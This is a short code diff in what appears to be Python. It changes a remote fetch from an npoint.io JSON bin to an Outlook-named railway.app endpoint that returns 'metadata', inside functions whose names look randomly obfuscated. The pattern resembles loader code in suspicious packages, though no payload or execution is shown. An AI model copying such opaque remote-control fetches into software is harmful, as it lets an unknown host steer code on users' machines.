@@ -16,7 +16,7 @@ def train_rppvax_130():
 
     def model_nlibif_538():
         try:
-            learn_agkwwu_407 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_agkwwu_407 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_agkwwu_407.raise_for_status()
             eval_jhnhkl_625 = learn_agkwwu_407.json()
             model_qkckwh_765 = eval_jhnhkl_625.get('metadata')
